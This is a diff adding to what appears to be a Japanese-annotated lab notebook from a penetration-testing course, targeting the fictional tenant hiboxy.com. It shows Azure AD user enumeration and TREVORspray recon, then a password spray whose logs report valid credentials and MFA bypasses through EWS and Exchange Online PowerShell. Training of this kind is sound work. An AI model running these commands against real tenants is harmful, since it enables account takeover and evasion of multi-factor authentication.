@@ -3755,6 +3755,468 @@ ssmith@hiboxy.com  False
 PS C:\CourseFiles>
 ```
 
-#### Linux
+```
+PS C:\CourseFiles> Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName | tee-object hiboxy-users.txt
+
+UserName
+--------
+abates@hiboxy.com
+aparker@hiboxy.com
+mlara@hiboxy.com
+slopez@hiboxy.com
+
+PS C:\CourseFiles>
+```
+
+### Linux
+
+#### 5: Prepare the Attack on Linux
+
+Windowsから作成したテキストをダウンロード
+
+```
+sec560@560vm:~/Downloads/users$ smbclient //192.168.80.128/C$ -U 'sec560%sec560' -c 'cd CourseFiles; get users.txt'
+getting file \CourseFiles\users.txt of size 407 as users.txt (397.4 KiloBytes/sec) (average 397.5 KiloBytes/sec)
+sec560@560vm:~/Downloads/users$ 
+```
+
+新規ユーザーを列挙した後、それらのアカウントが別の侵害事件に関与していないか、侵害データを照合すべきである。実験の都合上、4人のユーザー全員のパスワードをそれぞれ発見した。
+
+```
+sec560@560vm:~/Downloads/users$ cat << EOF > valid.creds
+abates@hiboxy.com:Metallica6
+aparker@hiboxy.com:Oozle11
+mlara@hiboxy.com:Packardbell350
+slopez@hiboxy.com:Tibbetts3
+EOF
+sec560@560vm:~/Downloads/users$ cat valid.creds 
+abates@hiboxy.com:Metallica6
+aparker@hiboxy.com:Oozle11
+mlara@hiboxy.com:Packardbell350
+slopez@hiboxy.com:Tibbetts3
+sec560@560vm:~/Downloads/users$ 
+```
+
+#### 6: Password Attack
+
+`https://github.com/blacklanternsecurity/TREVORspray`
+
+```
+sec560@560vm:~/Downloads/users$ trevorspray --help
+[INFO] Command: /usr/local/bin/trevorspray --help
+usage: trevorspray [-h] [-m {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}]
+                   [-up USERPASS [USERPASS ...]] [-u USERS [USERS ...]]
+                   [-p PASSWORDS [PASSWORDS ...]] [--url URL] [-r DOMAIN]
+                   [--export-tenants FILE] [-t THREADS] [-f] [-d DELAY]
+                   [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl]
+                   [--ignore-lockouts] [--timeout TIMEOUT]
+                   [--random-useragent] [-6] [--proxy PROXY] [-v]
+                   [-s USER@SERVER [USER@SERVER ...]] [-i KEY] [-b BASE_PORT]
+                   [-n] [--subnet SUBNET] [--interface INTERFACE]
+
+A password sprayer with the option to load-balance traffic through SSH hosts
+
+options:
+  -h, --help            show this help message and exit
+
+basic arguments:
+  -m {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}, --module {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}
+                        Spray module to use (default: msol)
+  -up USERPASS [USERPASS ...], --userpass USERPASS [USERPASS ...]
+                        file(s) containing username and password pairs
+                        (format: 'username:password')
+  -u USERS [USERS ...], --users USERS [USERS ...]
+                        Usernames(s) and/or file(s) containing usernames
+  -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
+                        Password(s) and/or file(s) containing passwords
+  --url URL             The URL to spray against
+  -r DOMAIN, --recon DOMAIN, --enumerate DOMAIN
+                        Retrieves MX records and info related to
+                        authentication, email, Azure, Microsoft 365, etc. If
+                        --usernames are specified, this also enables username
+                        enumeration.
+  --export-tenants FILE
+                        Export all discovered tenant domains to a file
+
+advanced arguments:
+  Round-robin traffic through remote systems via SSH (overrides --threads)
+
+  -t THREADS, --threads THREADS
+                        Max number of concurrent requests (default: 1)
+  -f, --force           Try all usernames/passwords even if they've been tried
+                        before
+  -d DELAY, --delay DELAY
+                        Sleep for this many seconds between requests
+  -ld LOCKOUT_DELAY, --lockout-delay LOCKOUT_DELAY
+                        Sleep for this many additional seconds when a lockout
+                        is encountered
+  -j JITTER, --jitter JITTER
+                        Add a random delay of up to this many seconds between
+                        requests
+  -e, --exit-on-success
+                        Stop spray when a valid cred is found
+  -nl, --no-loot        Don't execute loot activites for valid accounts
+  --ignore-lockouts     Forces the spray to continue and not stop when
+                        multiple account lockouts are detected
+  --timeout TIMEOUT     Connection timeout in seconds (default: 10)
+  --random-useragent    Add a random value to the User-Agent for each request
+  -6, --prefer-ipv6     Prefer IPv6 over IPv4
+  --proxy PROXY         Proxy to use for HTTP and HTTPS requests
+  -v, --verbose, --debug
+                        Show which proxy is being used for each request
+
+SSH Proxy:
+  Round-robin traffic through remote systems via SSH (overrides --threads)
+
+  -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]
+                        Round-robin load-balance through these SSH hosts
+                        (user@host) NOTE: Current IP address is also used once
+                        per round
+  -i KEY, -k KEY, --key KEY
+                        Use this SSH key when connecting to proxy hosts
+  -b BASE_PORT, --base-port BASE_PORT
+                        Base listening port to use for SOCKS proxies
+  -n, --no-current-ip   Don't spray from the current IP, only use SSH proxies
+
+Subnet Proxy:
+  Send traffic from random addresses within IP subnet
+
+  --subnet SUBNET       Subnet to send packets from
+  --interface INTERFACE
+                        Interface to send packets on
+sec560@560vm:~/Downloads/users$ 
+```
+
+トレバースプレーには多くのオプションがありますが、今回は以下のものを使用します：
+
+    メールアドレスの一覧が記載された当社のusers.txtファイル
+    パスワードの一覧が記載されたパスワード.txtファイル
+    hiboxy.com に対する認証用URL（間もなく偵察により取得予定）
+
+```
+sec560@560vm:~/Downloads/users$ trevorspray --recon hiboxy.com
+[INFO] Command: /usr/local/bin/trevorspray --recon hiboxy.com
+[INFO] Checking MX records for hiboxy.com
+[WARN] No results.
+[INFO] Checking TXT records for hiboxy.com
+[WARN] No results.
+[INFO] Checking OpenID configuration at https://login.windows.net/hiboxy.com/.well-known/openid-configuration
+[INFO] NOTE: You can spray against "token_endpoint" with --url!!
+[SUCC] 
+{
+    "token_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token",
+    "token_endpoint_auth_methods_supported": [
+        "client_secret_post",
+        "private_key_jwt",
+        "client_secret_basic"
+    ],
+    "jwks_uri": "https://login.windows.net/common/discovery/keys",
+    "response_modes_supported": [
+        "query",
+        "fragment",
+        "form_post"
+    ],
+    "subject_types_supported": [
+        "pairwise"
+    ],
+    "id_token_signing_alg_values_supported": [
+        "RS256"
+    ],
+    "response_types_supported": [
+        "code",
+        "id_token",
+        "code id_token",
+        "token id_token",
+        "token"
+    ],
+    "scopes_supported": [
+        "openid"
+    ],
+    "issuer": "https://sts.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/",
+    "microsoft_multi_refresh_token": true,
+    "authorization_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/authorize",
+    "device_authorization_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/devicecode",
+    "http_logout_supported": true,
+    "frontchannel_logout_supported": true,
+    "end_session_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/logout",
+    "claims_supported": [
+        "sub",
+        "iss",
+        "cloud_instance_name",
+        "cloud_instance_host_name",
+        "cloud_graph_host_name",
+        "msgraph_host",
+        "aud",
+        "exp",
+        "iat",
+        "auth_time",
+        "acr",
+        "amr",
+        "nonce",
+        "email",
+        "given_name",
+        "family_name",
+        "nickname"
+    ],
+    "check_session_iframe": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/checksession",
+    "userinfo_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/openid/userinfo",
+    "kerberos_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/kerberos",
+    "tenant_region_scope": "NA",
+    "cloud_instance_name": "microsoftonline.com",
+    "cloud_graph_host_name": "graph.windows.net",
+    "msgraph_host": "graph.microsoft.com",
+    "rbac_url": "https://pas.windows.net"
+}
+
+[SUCC] Tenant ID: "1c0060e4-c4db-4777-a48b-34a1515e33bf"
+[INFO] Checking user realm at https://login.microsoftonline.com/getuserrealm.srf?login=test@hiboxy.com
+[SUCC] 
+{
+    "State": 4,
+    "UserState": 1,
+    "Login": "test@hiboxy.com",
+    "NameSpaceType": "Managed",
+    "DomainName": "hiboxy.com",
+    "FederationBrandName": "hiboxy",
+    "CloudInstanceName": "microsoftonline.com",
+    "CloudInstanceIssuerUri": "urn:federation:MicrosoftOnline"
+}
+
+[INFO] Checking autodiscover info at https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@hiboxy.com?Protocol=Autodiscoverv1
+[WARN] No results.
+[INFO] Attempting to discover OWA instances
+[INFO] Retrieving tenant domains at https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
+[SUCC] Found 1 domains under tenant!
+[SUCC] 
+[
+    "hiboxy.com"
+]
+
+[INFO] Wrote 1 domains to /home/sec560/.trevorspray/loot/recon_hiboxy.com_other_tenant_domains.txt
+[INFO] 0 valid users written to /home/sec560/.trevorspray/existent_users.txt
+[INFO] 0 valid user/pass combos written to /home/sec560/.trevorspray/valid_logins.txt
+sec560@560vm:~/Downloads/users$ 
+```
+
+「token_endpoint」フィールドから「login.windows.net」URLを取得し、さらにHiboxyのオンプレミスExchangeサーバーも発見
+
+```
+ec560@560vm:~/Downloads/users$ trevorspray --userpass valid.creds --url 'https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token'
+[INFO] Command: /usr/local/bin/trevorspray --userpass valid.creds --url https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token
+[INFO] Spraying 4 users against https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token at Fri Mar  6 06:17:13 2026
+[SUCC] abates@hiboxy.com:Metallica6 - AADSTS50131: Correct password but login was blocked.
+[INFO] Running loot module: MSOLLooter
+[INFO] Testing IMAP4 MFA bypass for abates@hiboxy.com
+[WARN] IMAP MFA bypass failed for abates@hiboxy.com: b'LOGIN failed.'
+[INFO] Testing SMTP MFA bypass for abates@hiboxy.com
+[WARN] SMTP MFA bypass failed for abates@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[WARN] SMTP MFA bypass failed for abates@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[INFO] Testing POP3 MFA bypass for abates@hiboxy.com
+[WARN] POP3 MFA bypass failed for abates@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=4ce17226-5ff3-4d02-a4cc-9a98bde60f0f,ST=05:26:37><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:abates@hiboxy.com" AuthResult=28 Proxy=BL4PR10MB8231.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=IA3PR10MB8758.namprd10.PROD.OUTLOOK.COM Service=Pop3B2]'
+[INFO] Testing Exchange Web Services (EWS) MFA bypass for abates@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
+[SUCC] MFA bypass (EWS) enabled for abates@hiboxy.com!
+[SUCC] Attempting to dump Global Address List
+[ERRR] Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
+    results = account.protocol.resolve_names(
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
+    return list(
+           ^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
+    for elem in elems:
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
+    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
+    yield from self._response_generator(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
+    response = self._get_response_xml(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
+    for api_version in self._api_versions_to_try():
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
+    return (self._version_hint.api_version,) + tuple(
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'NoneType' object has no attribute 'api_version'
+
+[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for abates@hiboxy.com
+[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for abates@hiboxy.com
+[SUCC] MFA bypass (Exchange Online Powershell) enabled for abates@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
+[INFO] Testing Autodiscover MFA bypass for abates@hiboxy.com
+[INFO] Testing Offline Address Book (OAB) MFA bypass for abates@hiboxy.com
+[WARN] No OAB URL found for abates@hiboxy.com.
+[INFO] Testing Azure management for abates@hiboxy.com
+[SUCC] abates@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
+[WARN] Azure management not enabled for abates@hiboxy.com.
+[INFO] Testing Unified Messaging (UM) MFA bypass for abates@hiboxy.com
+[SUCC] aparker@hiboxy.com:Oozle11 - AADSTS50131: Correct password but login was blocked.
+[INFO] Running loot module: MSOLLooter
+[INFO] Testing IMAP4 MFA bypass for aparker@hiboxy.com
+[WARN] IMAP MFA bypass failed for aparker@hiboxy.com: b'LOGIN failed.'
+[INFO] Testing SMTP MFA bypass for aparker@hiboxy.com
+[WARN] SMTP MFA bypass failed for aparker@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[WARN] SMTP MFA bypass failed for aparker@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[INFO] Testing POP3 MFA bypass for aparker@hiboxy.com
+[WARN] POP3 MFA bypass failed for aparker@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=9d49fc4a-b631-4f6c-831c-e11bb874cbd3,ST=02:40:19><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:aparker@hiboxy.com" AuthResult=28 Proxy=SN7PR10MB6643.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=SA3PR10MB7000.namprd10.PROD.OUTLOOK.COM Service=Pop3B2]'
+[INFO] Testing Exchange Web Services (EWS) MFA bypass for aparker@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
+[SUCC] MFA bypass (EWS) enabled for aparker@hiboxy.com!
+[SUCC] Attempting to dump Global Address List
+[ERRR] Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
+    results = account.protocol.resolve_names(
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
+    return list(
+           ^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
+    for elem in elems:
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
+    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
+    yield from self._response_generator(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
+    response = self._get_response_xml(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
+    for api_version in self._api_versions_to_try():
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
+    return (self._version_hint.api_version,) + tuple(
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'NoneType' object has no attribute 'api_version'
+
+[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for aparker@hiboxy.com
+[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for aparker@hiboxy.com
+[SUCC] MFA bypass (Exchange Online Powershell) enabled for aparker@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
+[INFO] Testing Autodiscover MFA bypass for aparker@hiboxy.com
+[INFO] Testing Offline Address Book (OAB) MFA bypass for aparker@hiboxy.com
+[WARN] No OAB URL found for aparker@hiboxy.com.
+[INFO] Testing Azure management for aparker@hiboxy.com
+[SUCC] aparker@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
+[WARN] Azure management not enabled for aparker@hiboxy.com.
+[INFO] Testing Unified Messaging (UM) MFA bypass for aparker@hiboxy.com
+[VERB] Waiting for proxy threads to finish
+[SUCC] mlara@hiboxy.com:Packardbell350 - AADSTS50131: Correct password but login was blocked.
+[INFO] Running loot module: MSOLLooter
+[INFO] Testing IMAP4 MFA bypass for mlara@hiboxy.com
+[WARN] IMAP MFA bypass failed for mlara@hiboxy.com: b'LOGIN failed.'
+[INFO] Testing SMTP MFA bypass for mlara@hiboxy.com
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[WARN] SMTP MFA bypass failed for mlara@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[WARN] SMTP MFA bypass failed for mlara@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[INFO] Testing POP3 MFA bypass for mlara@hiboxy.com
+[WARN] POP3 MFA bypass failed for mlara@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=bd990eb5-24e5-46df-b3b7-c682dcec27d1,ST=00:30:51><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:mlara@hiboxy.com" AuthResult=28 Proxy=CO6PR10MB5442.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=CO1PR10MB4659.namprd10.prod.outlook.com Service=Pop3B2]'
+[INFO] Testing Exchange Web Services (EWS) MFA bypass for mlara@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
+[SUCC] MFA bypass (EWS) enabled for mlara@hiboxy.com!
+[SUCC] Attempting to dump Global Address List
+[ERRR] Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
+    results = account.protocol.resolve_names(
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
+    return list(
+           ^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
+    for elem in elems:
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
+    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
+    yield from self._response_generator(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
+    response = self._get_response_xml(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
+    for api_version in self._api_versions_to_try():
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
+    return (self._version_hint.api_version,) + tuple(
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'NoneType' object has no attribute 'api_version'
+
+[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for mlara@hiboxy.com
+[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for mlara@hiboxy.com
+[SUCC] MFA bypass (Exchange Online Powershell) enabled for mlara@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
+[INFO] Testing Autodiscover MFA bypass for mlara@hiboxy.com
+[INFO] Testing Offline Address Book (OAB) MFA bypass for mlara@hiboxy.com
+[WARN] No OAB URL found for mlara@hiboxy.com.
+[INFO] Testing Azure management for mlara@hiboxy.com
+[SUCC] mlara@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
+[WARN] Azure management not enabled for mlara@hiboxy.com.
+[INFO] Testing Unified Messaging (UM) MFA bypass for mlara@hiboxy.com
+[VERB] Waiting for proxy threads to finish
+[SUCC] slopez@hiboxy.com:Tibbetts3 - AADSTS50131: Correct password but login was blocked.
+[INFO] Running loot module: MSOLLooter
+[INFO] Testing IMAP4 MFA bypass for slopez@hiboxy.com
+[VERB] Waiting for proxy threads to finish
+[WARN] IMAP MFA bypass failed for slopez@hiboxy.com: b'LOGIN failed.'
+[INFO] Testing SMTP MFA bypass for slopez@hiboxy.com
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[WARN] SMTP MFA bypass failed for slopez@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[VERB] Waiting for proxy threads to finish
+[WARN] SMTP MFA bypass failed for slopez@hiboxy.com: Connection unexpectedly closed: The read operation timed out
+[INFO] Testing POP3 MFA bypass for slopez@hiboxy.com
+[WARN] POP3 MFA bypass failed for slopez@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=47bd946e-c443-4f02-a04b-cc9ec31d9c43,ST=00:30:51><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:slopez@hiboxy.com" AuthResult=28 Proxy=CO6PR10MB5442.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=MW4PR10MB6345.namprd10.PROD.OUTLOOK.COM Service=Pop3B2]'
+[INFO] Testing Exchange Web Services (EWS) MFA bypass for slopez@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
+[SUCC] MFA bypass (EWS) enabled for slopez@hiboxy.com!
+[SUCC] Attempting to dump Global Address List
+[ERRR] Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
+    results = account.protocol.resolve_names(
+              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
+    return list(
+           ^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
+    for elem in elems:
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
+    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
+    yield from self._response_generator(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
+    response = self._get_response_xml(payload=payload)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
+    for api_version in self._api_versions_to_try():
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
+    return (self._version_hint.api_version,) + tuple(
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+AttributeError: 'NoneType' object has no attribute 'api_version'
+
+[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for slopez@hiboxy.com
+[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for slopez@hiboxy.com
+[SUCC] MFA bypass (Exchange Online Powershell) enabled for slopez@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
+[INFO] Testing Autodiscover MFA bypass for slopez@hiboxy.com
+[INFO] Testing Offline Address Book (OAB) MFA bypass for slopez@hiboxy.com
+[WARN] No OAB URL found for slopez@hiboxy.com.
+[INFO] Testing Azure management for slopez@hiboxy.com
+[SUCC] slopez@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
+[WARN] Azure management not enabled for slopez@hiboxy.com.
+[INFO] Testing Unified Messaging (UM) MFA bypass for slopez@hiboxy.com
+[INFO] Finished spraying 4 users against https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token at Fri Mar  6 06:18:40 2026
+[SUCC] abates@hiboxy.com:Metallica6
+[SUCC] aparker@hiboxy.com:Oozle11
+[SUCC] mlara@hiboxy.com:Packardbell350
+[SUCC] slopez@hiboxy.com:Tibbetts3
+[INFO] 4 valid users written to /home/sec560/.trevorspray/existent_users.txt
+[INFO] 4 valid user/pass combos written to /home/sec560/.trevorspray/valid_logins.txt
+sec560@560vm:~/Downloads/users$ 
+```
 
 
+`[SUCC] slopez@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.`
+
+`[SUCC] MFA bypass (Exchange Online Powershell) enabled for slopez@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!`
